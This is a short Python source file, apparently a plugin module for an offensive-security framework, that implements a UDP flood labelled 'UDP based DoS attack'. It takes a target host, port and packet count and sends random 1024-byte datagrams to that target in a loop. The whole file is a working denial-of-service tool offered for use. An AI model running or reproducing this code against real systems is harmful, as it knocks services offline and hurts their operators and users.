import requests
from rich.console import Console
from rich.table import Table
import socket
import random
import os


class Module:
    def __init__(self, logger):
        self.logger = logger
        self.name = "dos/udp"
        self.description = "UDP based DoS attack."
        self.author = "Onur Atakan ULUSOY"
        self.runauto = False        
        self.options = {
            "target": {"value": None, "required": True},
            "port": {"value": None, "required": True},
            "amount": {"value": None, "required": True},
        }

    def info(self):
        console = Console()
        table = Table()
        table.add_column("Name")
        table.add_column("Description")
        table.add_column("Author")
        table.add_row(self.name, self.description, self.author)
        console.print(table)


    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error(f"Required key {str(key)} is not set for {self.name}")
                return


        target = self.options["target"]["value"]
        port = int(self.options["port"]["value"])
        amount = int(self.options["amount"]["value"])


        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        size = os.urandom(min(65500, 1024))
        # loop for continuous sending packets
        for i in range(amount):
            s.sendto(size, (target, port))
        s.close()

        print(f"\033[32m[+]\033[0m Finished UDP based DoS attack on {target}-{port}")


